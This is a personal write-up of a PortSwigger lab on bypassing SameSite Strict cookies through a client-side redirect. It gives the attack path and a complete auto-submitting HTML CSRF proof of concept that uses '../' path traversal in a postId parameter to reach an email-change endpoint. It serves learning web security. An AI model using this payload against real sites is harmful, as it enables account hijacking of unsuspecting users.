# [SameSite Strict bypass via client-side redirect] — [PortSwigger] — [Practitioner]
**Date:** 2026-06-09
 
---
 
## Vulnerability / core concept
Cross-site Request Forgery

## What made me stuck
I got the main idea of the attack, however, I just missed that `postId` from one request is used to determine the other, and we can change that `postId` to whatever we like to exploit it.
 
## What unblocked me
After some time trying by myself, I decided to get quick help from AI to leverage my idea.
 
---


## Attack path
1) First we need to log in to access email change functionality.
2) After logging in, we start our recon. Keep in mind that this app uses SameSite Strict protection.
3) During recon, I noticed that when user posts comment, he is moved to Thanks for request page and then auto-redirected to post again. I tested this in incognito and this works there as well, it does not require user's account or anything. That means we can share it.
4) After `/post/comment/confirmation?postId=4` request, we are redirected to `/post/4`. I knew that I need to somehow change the path of second redirect request, so we can execute csrf attack. It is because when I tested GET `/my-account/change-email?victim%40babek&submit=1`, it worked and it changed the email. I was just stuck on that `/post/xxx` path. This is where AI helped me.
5) All we had to do is to write `../` before our malicious url, and this way we will reach the correct endpoint and complete csrf attack.
6) Therefore, if we wrote URL encoded `/post/comment/confirmation?postId=../my-account/change-email?email=victim@babk&submit=1` it would redirect us to `/my-account/change-email?email=victim@babk&submit=1`. Now all we need to do is to deliver this to victim and complete csrf attack and solve the lab.

---


## Payload / key command
```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body>
    <h3>Standard CSRF PoC</h3>
        <form action="https://0a86006f04105b2d80b1267d006e0001.web-security-academy.net/post/comment/confirmation" method="GET">
    <input type="hidden" name="postId" value="../my-account/change-email?email=victim@babek&submit=1">
</form>
        <input type="submit" value="Submit request" />
    </form>
    <script>
        history.pushState('', '', '/');
        document.forms[0].submit();
    </script>
</body>
</html>
```
Note: It is important to include `postId` value as a hidden input, because if we put it directly into the path, the query part will be truncated and our payload will not work.

---


## What I'd recognize faster next time
If application auto-redirects user without proper client input security and csrf token, this can lead to potential csrf attack like in this lab. It is also important to keep in mind that we can use `../` to move to valid endpoint. 

